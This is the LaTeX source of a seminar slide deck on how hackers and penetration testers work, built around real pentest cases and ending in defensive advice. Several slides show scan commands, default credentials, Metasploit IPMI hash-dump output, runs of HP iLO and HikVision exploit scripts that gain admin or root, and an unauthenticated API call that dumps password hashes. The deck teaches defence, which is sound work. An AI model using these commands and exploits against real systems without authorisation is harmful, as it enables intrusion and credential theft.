\documentclass[Screen16to9,17pt]{foils}
\usepackage{zencurity-slides}
\usepackage{tabularx}

\selectlanguage{english}

% Seminar: Hackerseminar, SikkerhedsBranchens IT-sikkerhedsudvalg
% Kl. 12.30-13.30: Hvad laver hackere?
% Hvad laver en hacker egentlig? Og hvordan ser det ud, når en hacker finder
% vej ind et sted, der ellers burde være lukket land?
% Henrik Kramselund fortæller, hvordan man arbejder som hacker og
% perspektiverer det til sikkerhedsbranchen.

\begin{document}

\mytitlepage{Hackerseminar -- how hackers work}{SikkerhedsBranchen}

\hlkprofiluk

% Slides 3-6 from ../hacking-today/hacking-today.tex, translated to English

\slide{Hacker - cracker}

{\bfseries The short answer - drop the discussion}

The word originally had a different meaning, but the media adopted
the term - and today it has both meanings.

{\color{red}\hlkbig Today a hacker is still someone who breaks into systems!}

ref. Spafford, Cheswick, Garfinkel, Stoll, ...
- all well-known names in security

If you want to know more, start with:
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}


\slide{Hacking is magic}

\hlkimage{6cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking sometimes looks like magic}


\slide{Hacking is not magic}

\hlkimage{14cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking just requires a little ninja training}

\slide{Movie:Kryptonite lock - old}

\hlkimage{11cm}{youtube-bic-lock.png}

\begin{list1}
\item Just search for: kryptonite lock bic pen
\item \link{https://www.youtube.com/watch?v=LahDQ2ZQ3e0}
\end{list1}


\slide{Attack overview}

\hlkimage{19cm}{sicherheitstacho.png}

{\small\link{http://www.sicherheitstacho.eu/?lang=en}}

\slide{What does a hacker actually do?}

\begin{minipage}[t]{0.44\textwidth}
{\bf Criminal hacker}
\begin{list2}
\item Unstructured and opportunistic -- looks for the easiest way in
\item Uses a small number of known exploits, scans widely for systems they work on
\item Only needs to find one hole
\item No scope, no time limit, no report
\end{list2}
\end{minipage}\hfill
\begin{minipage}[t]{0.44\textwidth}
{\bf Pentester}
\begin{list2}
\item Structured and methodical -- follows a methodology and a checklist
\item Tries to find all the vulnerabilities, not just one
\item Works within an agreed scope and time frame, with written permission
\item Delivers a report with findings and recommendations
\end{list2}
\end{minipage}

\vskip 1cm
\centerline{\bf Defenders must close all the holes -- attackers only need one}

% Network mapping from slide 22 of ../hacking-today/hacking-today.tex, translated to English

\slide{How does a hacker find a way in?}

\hlkimage{15cm}{images/network-example.pdf}

\begin{list1}
\item Network mapping: using traceroute and similar programs you can often
  deduce the topology of the network you are investigating
\end{list1}

% Cases copied from ../pentest-cases/pentest-cases.tex (Shit Happened -- Advice for enterprise networks)

\slide{How do we find systems -- Nmap banner scanning }

\begin{alltt}\scriptsize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    {\bf Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)}
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Nmap scanning is quick and easy -- scan 100s of IP addresses quickly
\item Can even save output as XML and includes Ndiff for comparing scans
\item Network scanning is often the most efficient way to get an overview
\item The network scan can immediately identify services which should NOT be available
\end{list2}


\slide{Shit Happened}


\begin{alltt}
Login: admin
Password: admin
\end{alltt}

\begin{list2}
\item Sometimes you buy something, power it, and forget about it
\item We all do
\item It is still a problem if it happens at work
\item Good thing, often easier to find with scanning tools
\end{list2}


\slide{Negligence and appropriate paranoia}

%\hlkimage{}{im-a-hacker.jpg}

\begin{quote}
Negligence (Lat. negligentia)[1] is a failure to exercise appropriate and/or ethical ruled care expected to be exercised amongst specified circumstances.[2] The area of tort law known as negligence involves harm caused by failing to act as a form of carelessness possibly with extenuating circumstances.
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Negligence}


\begin{list2}
\item I often find systems that someone \emph{had} to configure -- and they still have admin/admin
\item That is not bad luck, it is negligence: someone touched it and chose not to secure it
\item Change default passwords during installation, not ``later''
\item Use a checklist or baseline, e.g.\ CIS Benchmarks, and verify with a scan afterwards
\item Assume someone will find it -- because their scanner will
\end{list2}

\centerline{\bf Appropriate paranoia is part of the job}

\slide{On-site pentesting}
% Flere sager, men eksampelvis hos Forsikringsselskab med admin/admin

%\hlkimage{}{}

So doing pentest can be remote or on-site, at the customer site. I was at this insurance company, very professional, very nice, doing pentesting on the network.

I scanned the network and found the usual stuff, which often includes
\begin{list2}
\item Dirty server room -- they all rely on the devices in this room, great
\item No UPS -- power cables are a mess
\item Printers with default settings -- we can have fun reconfiguring them
\item Server administration -- more about that later
\end{list2}

The usual stuff ...


\slide{Nice Rack you got there!}

\hlkimage{8cm}{rackskab.jpg}

\slide{Physical Inspection is Needed}

Yes, go through the server room!

Things we find:
\begin{list2}
\item Single firewall, running with a single power supply -- single point of failure
\item No Uninterruptable Power Supply -- having NO UPS is bad if availability is important
\item Bad cabling, disaster can strike, and no one can help you
\item Bad cooling can take down your whole company
\end{list2}

Advice: Start documenting your setup -- buy a label maker today

Remember security is CIA: {\bf Confidentiality, Integrity and Availability} -- all of these findings hit availability

\slide{Core Switch Administration}

Then I also found switch administration with admin/admin *sigh*

\hlkimage{8cm}{edgemax-admin-admin.png}

\begin{list2}
\item Is this the main switch for the whole office?! Yes - unfortunately
\item Admin on the core switch hits {\bf Confidentiality} -- mirror a port and sniff all traffic -- and {\bf Integrity} -- change VLANs and redirect traffic
\end{list2}

\slide{Upgrade your firmware (2020)}

%\hlkimage{}{}

This was seen at the same customer in 2020:
\begin{alltt}
Cisco ASA Version 9.8(2) - Released: August 28, 2017
Cisco ASDM 7.8(2)Cisco
\end{alltt}

\begin{list2}
\item We can talk about firmware quality, but if you haven't \emph{upgraded} it in 3+ years ...
\item Firmware updates fix known problems and security issues -- install them
\item Create a process to review and update once in a while
\end{list2}

{\bf All software has bugs -- some are serious}

\begin{quote}\small
Program testing can be used to show the presence of bugs, but never to show their absence!\\
-- Edsger W. Dijkstra, \emph{Notes on Structured Programming} (EWD249), 1970
\end{quote}

\slide{Firewalls have software too}

Most major firewall and security vendors have had serious vulnerabilities
\begin{list2}
\item \emph{Fortinet} -- 27 new CVEs disclosed in a single two-day stretch in April 2026 across FortiOS, FortiSandbox, FortiWeb and more, several critical/unauthenticated\\
\link{https://www.greenbone.net/en/blog/fortinet-rce-vulnerabilities-2026-critical-vulnerabilities-in-fortisandbox/}
\item CVE-2024-3400 PAN-OS GlobalProtect OS command injection, CVSS 10.0
\item CVE-2024-21762 FortiOS sslvpnd out-of-bounds write, unauthenticated RCE, CVSS 9.8
\item CVE-2024-21591 Juniper Junos OS J-Web out-of-bounds write, unauthenticated RCE as root, CVSS 9.8
\item CVE-2024-24919 Check Point Quantum Security Gateways information disclosure, CVSS 8.6
\end{list2}


\slide{Microsoft Patch Tuesday: June--October 2026}

\begin{tabularx}{22cm}{|X|r| r|r|r|}\hline
Month & CVEs (Microsoft) & Critical & Zero-days & Exploited \\\hline
June  & 198--208  & 32--37 & 3 & 0 at release$^{*}$ \\\hline
July  & 569--570  & 56--59 & 3 & 2 \\\hline
August & 398--421 & 42--62 & 1--3 & 1 \\\hline
September & 964--974 & 50--113 & 2 & 2 \\\hline
October & 1{,}407--1{,}411 & 69--70 & 2--3 & 1 \\\hline
\end{tabularx}

{\footnotesize $^{*}$ CVE-2026-41089 Netlogon RCE, CVSS 9.8, was disclosed in May and confirmed exploited in June}

\begin{list2}
\item Vendor counts disagree by month; the ranges reflect Microsoft's own bulletin count versus third-party trackers (Tenable, BleepingComputer, N-able, Krebs on Security, Qualys, Lansweeper)
\item Each record is broken within months: July, then September, then October with more than 1,400 CVEs -- AI-assisted vulnerability discovery is cited as a factor
\item ZDI: 2,760 Microsoft CVEs patched in 2026 before the October release -- more than double any previous full year
\end{list2}


\slide{Microsoft Patch Tuesday -- September 2026}
\begin{list2}
\item 964--974 CVEs, 50--113 critical, 2 exploited zero-days -- largest Patch Tuesday at the time
\item CVE-2026-81963 -- Windows Update Stack EoP, CVSS 7.8, on CISA KEV
\item CVE-2026-85880 -- Windows ALPC heap overflow EoP, CVSS 7.8, AppContainer sandbox escape, on CISA KEV
\item CVE-2026-69730 -- Windows DNS Server RCE, use-after-free, CVSS 9.8, unauthenticated, not exploited at release\\
\link{https://www.tenable.com/blog/microsofts-september-2026-patch-tuesday-addresses-964-cves-cve-2026-81963-cve-2026-85880}
\item Out-of-band update needed days later: the patches broke Remote Desktop Services, Hyper-V Linux VMs and USB audio
\end{list2}


\slide{Microsoft Patch Tuesday -- October 2026}
\begin{list2}
\item 1,407 CVEs (Tenable) or 1,411 (BleepingComputer), 69--70 critical -- largest Patch Tuesday ever
\item CVE-2026-96951 -- Windows Shell security feature bypass, Mark of the Web bypass via a malicious file, CVSS 8.8, exploited zero-day
\item CVE-2026-108398 -- .NET Framework security feature bypass, WDAC bypass, CVSS 8.8, publicly disclosed
\item CVE-2026-70279 -- Exchange Server spoofing, CVSS 9.3, exploitation more likely\\
\link{https://www.tenable.com/blog/microsofts-october-2026-patch-tuesday-addresses-1407-cves-cve-2026-96951}
\item Zero-day count disagrees: Tenable says 2, BleepingComputer says 3, adding CVE-2026-92707 MessagePack-CSharp DoS\\
{\footnotesize \link{https://www.bleepingcomputer.com/news/microsoft/microsoft-october-2026-patch-tuesday-fixes-1-411-flaws-3-zero-days/}}
\end{list2}


\slide{Not just Microsoft}
\begin{list2}
\item Microsoft is a well-known vendor here, but far from the only vendor with high numbers
\item \emph{Linux kernel} -- 5{,}681 CVEs in 2025 (highest single year ever recorded); already 2{,}308 CVEs in H1 2026, the single highest vendor count for the period\\
\link{https://linuxiac.com/linux-tops-2026-cve-charts/}
\item \emph{Oracle} -- 1{,}235 CVEs in a single Critical Patch Update, July 2026
\item \emph{Google/Chromium} -- 1{,}752 CVEs H1 2026
\item Hackers only need one of these in a system you forgot to update
\end{list2}


\slide{SNMP -- problem child since the 1980s}

\begin{quote}
5.5 Simple Network Management Protocol
The Simple Network Management Protocol (SNMP) [37] has recently been defined to aid in network
management. Clearly, access to such a resource must be heavily protected. The RFC states this, but
also allows for a null authentication service; this is a bad idea. {\bf Even a ‘‘read-only’’ mode is dangerous;}
it may expose the target host to netstat-type attacks if the particular Management Information Base
(MIB) [38] used includes sequence numbers. ...
\end{quote}
Source: The paper \emph{Security Problems in the TCP/IP Protocol Suite} was originally\\
published in Computer Communication Review, Vol. 19, No. 2, in April, 1989, Steven M. Bellovin\\
\url{https://www.cs.columbia.edu/~smb/papers/ipext.pdf}

An update was published in 2004
\emph{A Look Back at “Security Problems in the TCP/IP Protocol Suite”}, \\
Steven M. Bellovin
\url{https://www.cs.columbia.edu/~smb/papers/acsac-ipext.pdf}

\slide{SNMP Public (2013)}
% Bank! SRX

So if this was common knowledge since the 1980s, why do we still see systems with SNMP \verb+public+

\begin{quote}
I flew into Moscow and was placed in a bank's infrastructure with very limited access. I scanned and found nothing really -- slow going, and I was getting frustrated.

\medskip
Then one scan found the core firewall, a Juniper SRX3400, answering to exactly that community string.

\medskip
From then on information came like a waterfall. I could map the whole network: systems, MAC addresses, the IP plan, live systems -- and live sessions. Anything passing through the firewall was available for reading.
\end{quote}

\vskip 1cm
\centerline{\bf One small misconfiguration -- and the whole network was mapped}

\slide{After mapping the network }

\begin{quote}
With the map in hand, the rest of the test became easy. I knew which machines were alive and could scan them efficiently, and the session table showed what the firewall actually allowed.

\medskip
Following that path I found network shares open to everyone, with files containing sensitive information: documents, passport pictures, ID pictures -- lots of personal information.
\end{quote}

\vskip 1cm
\centerline{\bf It all began with a simple SNMP walk}

\slide{Talking about SNMP and old software}

%\hlkimage{}{}

\begin{alltt}\scriptsize
$ nmap -sU -p 161 --script snmp-info 87.xxx // large danish commercial ISP IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 23:45 CEST
Nmap scan report for 87.xxx
Host is up (0.0014s latency).
PORT STATE SERVICE
161/udp open snmp
| snmp-info:
| enterprise: ciscoSystems
| engineIDFormat: unknown
| engineIDData: 0300a80c0d2f2378
| snmpEngineBoots: 40
|_ snmpEngineTime: {\bf 1086d04h20m16s}
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
\end{alltt}

\begin{list2}
\item SNMP uptime often correlates to last firmware update, 1086 days -- no firmware installed for a long time
\item Network mapping - can show network infrastructure information
\item Not uncommon with +1000 days -- some have 1500 or even 1800 days!
\item SNMP often identifies the device completely including patch level
\end{list2}



\slide{Old software (2019)}

%\hlkimage{}{}

How old can software be? This customer had some old DWL-3260AP access points

\begin{quote}
D-Link DWL-3260AP - 802.11g Managed Access Point.\\
”This product was phased out on: 20/05/2013”

\url{https://eu.dlink.com/uk/en/products/dwl-3260ap-wireless-ceiling-mount-poe-access-point}\\
 (link might not work anymore)

The software for this model is:\\
Firmware 1.20 rc340 Firmware 06/04/2009
\end{quote}

\vskip 2cm
\begin{list2}
\item At the time of testing in 2019 this was 10 year old software, probably full of security issues that will never be fixed
\item The news talks about dangerous zero-days, but attackers often just use vulnerabilities that have been public -- and patched -- for years
\end{list2}


% * Kan vi måske (KVM) ikke producere mere interne (IPMI) computer systemer som andre ikke kan styre
\slide{Management interfaces}

In general we have lots of \emph{management interfaces}, only intended for administrators. We should do our best to keep them isolated on management VLANs and have a secure configuration.

Server hardware typically have KVM (Keyboard Video Mouse) interfaces:
\begin{list2}
\item Compaq/HP Integrated Lights-Out (ILO) Management
\item Dell Remote Access Controller (iDRAC) default user root/calvin
\item Generic servers like SuperMicro have Intelligent Platform Management Interface (IPMI)\\
{\footnotesize\url{https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface}}
\end{list2}

Common problems found:
\begin{list2}
\item Default settings, default passwords -- often direct access to server administration
\item Not upgraded, firmware has known vulnerabilities
\item I have seen this for many many years, and still see this in networks after 2020
\end{list2}

\slide{Vulnerable HP ILO -- Metasploit module (2021)}

%\hlkimage{}{}

Vulnerability IPMI RAKP Dump hash:
\begin{alltt}\footnotesize
Name Description
---- -----------
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 172.16.10.205:623 - IPMI - Hash found: Administrator:ef4...c956bf6c9a9618a771c
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > setg RHOSTS 172.16.10.200
RHOSTS => 172.16.10.200
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 172.16.10.200:623 - IPMI - Hash found: Administrator:1aa4314318a30600...585fa89609bd2a9
\end{alltt}

Firmware was from 2017 -- so multiple years old, updates were available

\slide{Exploits are available (2021)}

%\hlkimage{}{}

\begin{alltt}\footnotesize
hkj@kate:~/bin$ ./get-users.py -h
usage: get-users.py [-h] [-t] [-e] [-u U] [-p P] ip
CVE-2017-12542 Tester and Exploiter script.
positional arguments:
  ip
  target IP
optional arguments:
  -h, --help show this help message and exit
  -t        Test. Trigger the exploit and list all users
  -e        Exploit. Create a new admin user with the credentials specified in -u and -p
  -u U      username of the new admin user
  -p P      password of the new admin user
hkj@kate:~/bin$ ./get-users.py 172.16.10.205
[+] Target is VULNERABLE!
[+] Account name: User Account Username: Administrator
[+] Account name: User Account Username: ilo
\end{alltt}


\begin{list2}
\item Another server had firmware from 2014 allowing the creation of administrative users directly
\end{list2}

\slide{Internet of Things -- to hack (2022)}

%\hlkimage{}{}

This case from 2022 was a municipality in Denmark, having HikVision IP cameras, these have been critisized a lot, for good reason.

In this case we told the customer when they showed up in the external scan, this is a high risk. Later when we looked more into them, we could find a ready made exploit:\\
CVE-2021-36260 HikVision Remote Code Execution – critical

And surely
\begin{alltt}\footnotesize
user@Zencurity:bin$ python3 hikvision210702-exec.txt --rhost 94.xxx --cmd "id"
[*] Hikvision CVE-2021-36260
[*] PoC by bashis <mcw noemail eu> (2021)
[*] Checking remote "94.xxx"
[i] ETag: "5c3-258-5e256676"
[!] Remote is verified exploitable{\bf
uid=0(admin) gid=0(root)}
\end{alltt}

\slide{UPS the UPS is on the network (2021)}

\hlkimage{14cm}{eaton-ups-admin.png}
This I have seen at multiple customers

\slide{Eaton by default allow admin/admin}

\hlkimage{11cm}{eaton-admin-shutdown.png}
\begin{list2}
\item Battery UPS (Uninterruptable Power Supply) for server room has default credentials admin/admin\\
 - also this interface is over unencrypted HTTP
\end{list2}

\slide{SNMP again!}

\hlkimage{11cm}{eaton-ups-snmp.png}

\begin{list2}
\item Eaton even has SNMP write community \verb+private+ configured
\item A single command with snmp-set could disable power
\end{list2}

\slide{HP Switches are very user friendly}

%\hlkimage{}{}

\begin{alltt}\scriptsize
$ telnet 172.16.1.21
Connected to 172.16.1.21.
HP J9772A 2530-48G-PoEP Switch
Software revision YA.16.08.0015
(C) Copyright 2020 Hewlett Packard Enterprise Development LP
RESTRICTED RIGHTS LEGEND
...
Press any key to continue
Your previous successful login (as manager) was on 1990-02-19 21:27:21
from 172.16.1.250
SW04Stuen# show configuration
Running configuration:
; J9772A Configuration Editor; Created on release #YA.16.08.0015
; Ver #14:01.44.00.04.19.02.13.98.82.34.61.18.28.f3.84.9c.63.ff.37.27:45
\end{alltt}

\begin{list2}
\item Nothing to see here -- just log me in without a password, thank you HP\\
No NTP servers, no log servers, default credentials, using bad default SNMP public, configured with VLANs
\end{list2}


\slide{Other Management interfaces}

%\hlkimage{}{}
Found on a single customer LAN:
\begin{list2}
\item UPS SNMP and Web available – also uses default credentials
\item Wi-Fi controller web interface available
\item HP ILO web interface - some with vulnerable software
\item Network printer interfaces
\item Storage devices – small NAS devices and Storwize
\item HP switch interfaces – web, telnet some with default vendor admin credentials and/or SNMP public
\item MOXA device Unknown usage
\item ESXi management interfaces on multiple port
\end{list2}

This was in 2021, and I wrote:\\
Note recent years have seen high risk vulnerabilities in these


\slide{Years after in 2023}

%\hlkimage{}{}

\begin{quote}{\bf
Ransomware Campaign Compromising VMware ESXi Servers}\\
On February 3, 2023, French web hosting provider OVH and French CERT issued warnings about a ransomware campaign that was targeting VMware ESXi servers worldwide with a new ransomware strain dubbed “ESXiArgs.” The campaign appears to be leveraging CVE-2021-21974, {\bf a nearly two-year-old heap overflow vulnerability in the OpenSLP service ESXi runs}. The ransomware operators are using opportunistic “spray and pray” tactics and have compromised hundreds of ESXi servers in the past few days, apparently including servers managed by hosting companies. ESXi servers exposed to the public internet are at particular risk.
\end{quote}
Source: \url{https://www.rapid7.com/blog/post/2023/02/06/ransomware-campaign-compromising-vmware-esxi-servers/}

\begin{list2}
\item Who allows these to be on the freaking internet!
\end{list2}


\slide{ESXi -- the same wave keeps coming}

VMware ESXi management stays exposed and keeps getting hit:

\begin{list2}
\item 2023: ESXiArgs ransomware via CVE-2021-21974, a two-year-old OpenSLP bug
\item 2024: CVE-2024-37085, Active Directory integration authentication bypass -- admin access to the host, exploited by ransomware groups
\item March 2025: Broadcom patched three actively exploited zero-days, reported by Microsoft -- CVE-2025-22224 (TOCTOU), CVE-2025-22225 (arbitrary kernel write, sandbox escape), CVE-2025-22226 (memory leak)
\item March 2025: Shadowserver saw 41,000+ vulnerable ESXi instances on the internet, Netlas 7,000+ exposed
\item February 2026: CISA confirmed CVE-2025-22225 is now used in ransomware campaigns
\end{list2}

Kevin Beaumont dubbed the 2025 chain {\bf ESXicape}: \emph{once you have ESX access, you can access everything on the ESX server}\\
{\footnotesize\link{https://www.securityweek.com/exploited-vmware-esxi-flaws-put-many-at-risk-of-ransomware-other-attacks/}}


% * Vokseværk - hvorfor står Exchange serveren stadig på client LAN
\slide{In 2022 Don't keep your Exchange server on the LAN!}

\hlkimage{11cm}{exchange-lan.pdf}

Another service that has been attacked for many years, at least since the Windows 2000 Server era, is Microsoft Exchange

This customer had their Exchange server directly on the LAN?!

\begin{list2}
\item There is a high risk that a single vulnerability in Microsoft Exchange would \\
open this network to complete compromise
\end{list2}


\slide{2026: Old Exchange servers are still on the internet in Denmark}

\begin{list2}
\item Exchange Server 2016 and 2019 went end of support on 14 October 2025
\item September 2026: research by Martin Stoltenberg Potestas, Sekuritet, found over 240 outdated mail servers open to the internet at Danish authorities, critical infrastructure, telcos and financial institutions\\
{\footnotesize\link{https://www.linkedin.com/in/potestas/}}
\item One example: an Exchange server at Cibicom, a Danish communications and IT infrastructure provider, with a security update from May 2021 -- more than five years old\\
{\footnotesize\link{https://ing.dk/artikel/hundreder-af-usikre-mailservere-blotlagt-i-danmark-en-staaende-invitation-til-cyberkriminelle}}
\item Early September 2026 the Danish Defence Intelligence Service (FE) warned authorities and companies about a concrete threat: replace your old Exchange servers
\item Several municipalities admitted the mistake and closed internet access to their old mail servers in a hurry, one ran a build from November 2022\\
{\footnotesize\link{https://ing.dk/artikel/kommuner-hastelukker-internetadgang-til-gamle-e-mailsystemer}}
\end{list2}


\slide{Web Application Security }

%\hlkimage{}{}

We typically see:
\begin{list2}
\item Libraries in web applications not updated JQuery especially
\item TLS settings still have TLS version 1.0 and 1.1 enabled -- recommend only 1.2 and 1.3
\item Cookies without \verb+secure+ and \verb+http only+ flags -- easy to fix
\item SQL injections also still seen
\item Old PHP versions seen PHP5 even! PHP7
\item Errors shown to the user -- helps an attacker prepare better requests
\end{list2}

Some of these can be identified by just running Nikto from Kali! Do it!

\slide{Testing Web APIs 2024}

\verb+https://customerdomain.example.com/api/customer/v1/business/$ENDPPOINT+\\
ENDPOINT being something like: employeedocuments, clientcontacts, businessPropertyObjects, activities

\begin{list2}
\item    We love REST and the world does too
\item REST using HTTP has the standard HTTP methods available (e.g., GET, POST, PUT, DELETE);
\item See also \link{https://en.wikipedia.org/wiki/Representational_state_transfer}
\end{list2}

\slide{IDOR and Blobs 2024}

While scanning an API we found links to blob storage:
\begin{quote}
    Privat og konfidensielt Arbeidsavtale found\\{\footnotesize
    \url{https://customer2storage.azureedge.net/customer-appid-1/Business-778/
EmployeeDetails-3815/2882_001-5.pdf}}\\
and Ansettelsesavtale\\ {\footnotesize\url{https://customer2storage.azureedge.net/customer-appid-1/Business-362/Employees-3463/
PrivateDocuments-122/ansettelsesdokumenterodd.pdf}}
\end{quote}
Clearly confidential data

\begin{list2}
    \item Insecure Direct Object Reference with no authentication
    \item Recommend using guidelines from OWASP \url{https://owasp.org/}, like:\\{\footnotesize
    \url{https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html}}
\end{list2}

\slide{Give Me AllUsers Unauthenticated -- pretty please}

%\hlkimage{}{}

\begin{verbatim}
[{"Id": 18,
"LanguageId": 1,
"RoleId": 4,
"ApplicationId": 1,
"BusinessId": 8,
"Rights": "[{\"id\":\"1\",\"name\":\"ACTIVE_ACCOUNT\",\"isChecked\":true,\"rightsType\":1},
...
"Username": "svein@example.com",
    "Email": "svein@example.com",
"Role": null,
"Password": "BJL...E=",}   // OMG PLEASE NO!!!!
"Mobile": null,
\end{verbatim}
Source: \verb+curl https://customerdomain.example.com/api/customer/v1/allusers+

\slide{Hashcracking - offline brute force}
\begin{list2}
\item A generic REST endpoint name, something that could be discovered using multiple methods
\item In this case I DID have the endpoints listed in JSON/Swagger/OpenAPI format
\item we can also combine this with another function, to find the organisations roles and positions:\\
\url{https://customerdomain.example.com/api/customer/v1/employeepositions}
\end{list2}


%\hlkimage{}{}

Identifying the hash is not conclusive, but was identified as:\\
\verb+BJL5Ffj...xSE= - Possible algorithms: Base64(unhex(SHA-256($plaintext)))+

Checking how many we have:
\begin{alltt}\small
$ jq . allusers.json | grep Password | wc -l
18282
\end{alltt}

\begin{list2}
\item Potential for cracking or verifying passwords, before attempting online brute-force attacks
\end{list2}

\slide{Keep Up to Date with technologies you use}

\begin{list2}
\item Make an effort
\item Be a professional
\end{list2}

Many definitions:
\begin{quote}\small
A {\bf professional} is a member of a profession or any person who works in a specified professional activity. The term also describes the {\bf standards of education and training} that prepare members of the profession with the {\bf particular knowledge and skills} necessary to perform their {\bf specific role} within that profession. In addition, most professionals are subject to {\bf strict codes of conduct}, enshrining {\bf rigorous ethical and moral obligations}.[1] Professional standards of practice and {\bf ethics} for a particular field are typically agreed upon and maintained through widely recognized professional associations, such as the IEEE.[2]
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Professional}

\begin{list2}
\item The field of IT has a lot of amateurs
\item Sorry if this sound elitist, but we should take responsebility not only for ourselves but for our communities
\end{list2}

\slide{Hackers don't give a shit}

\begin{minipage}[t]{0.68\textwidth}
\begin{list2}
\item Your system is only for testing, development, ...
\item Your network is a research network, under construction, being phased out, ...
\item Try something new, go to your management
\item Bring all the exceptions, all of them, update the risk analysis figures - if this happens it is about 1mill DKK
\item Ask for permission to go full monty on your security
\end{list2}

{\bf Think like attackers - don't hold back}
\end{minipage}\hfill
\begin{minipage}[t]{0.28\textwidth}
\vspace{0pt}
\includegraphics[width=\textwidth]{kiwicon-2009-hackers-dont-give-shit.jpg}
\end{minipage}


\slide{Advice for enterprise networks (and others)}


\begin{list2}
\item Portscanning - start using portscans in your networks, verify how far malware and hackers\\
 can travel, and identify soft systems needing updates or isolation
\item Have separation -- anywhere, starting with organisation units, management networks,\\
server networks, customers, guests, LAN, WAN, Mail, web, ...
\item Use Web proxies - do not allow HTTP directly except for a short allow list, \\
do not allow traffic to and from any new TLD
\item Use a malware filtering DNS service, like Quad9 \link{https://quad9.net/} \\
point your internal DNS servers to it, and add filtering and logging
\item Only allow SMTP via your own mail servers, create a simple forwarder if you must
\item In general \emph{harden your systems} -- devices with secure configuration are harder to hack
\end{list2}

{\bf Allow lists are better than block list, even if it takes some time to do it}

% End of copied cases

\slide{Perspective: the security industry}

In 1988 Eugene Spafford analysed the Morris Internet Worm at Purdue. Revisiting it 35 years later, he wrote:

\begin{quote}\small
All of that eventually led to a boom in add-on security measures, resulting in what is now a {\bf multi-billion dollar cybersecurity industry.}
...
The Worm provided us with an object lesson about many issues that, unfortunately, were not heeded in full to this day. {\bf That multi-billion dollar cybersecurity industry is still failing to protect far too many of our systems.}
\end{quote}
{\footnotesize Source: \emph{Reflecting on the Internet Worm at 35}, November 02, 2023, Eugene Spafford\\
\url{https://www.cerias.purdue.edu/site/blog/post/reflecting_on_the_internet_worm_at_35/}}

\begin{list2}
\item Don't trust the snake oil -- no box or AI product makes you secure on its own
\item Don't blindly trust security companies -- they sell products, and their products have vulnerabilities too
\item Find good sources: vendor security advisories, CISA KEV, CVE/NVD, independent researchers
\item Be skeptical -- ask for evidence, and test it yourself: portscan your own network
\end{list2}

\slide{Advice for the future}

\begin{quote}\small
Getting back to basics including more rigorous design and development practices, more education for developers, better user awareness, and increasing usability of security mechanisms are the best (and perhaps only) ways to improve the overall cybersecurity situation. If we don’t make these changes in our approach to security, in 30 years time you might be reading a similar (or the same) commentary on the state of cybersecurity.

{\bf Don’t say we didn’t warn you, then or now.}
\end{quote}
{\footnotesize Source: \emph{The Morris worm at 30}, Steven Furnell and Eugene H. Spafford, BCS, 18 February 2019\\
\url{https://www.bcs.org/articles-opinion-and-research/the-morris-worm-at-30/}}

\begin{list2}
\item Do the basics first: patching, hardening, separation, no default passwords
\item Security basics are like broccoli and sleep: everyone knows, few do it
\end{list2}

{\bf We keep iterating the same advice for decades, how can we make people change?!}

\myquestionspage

\end{document}
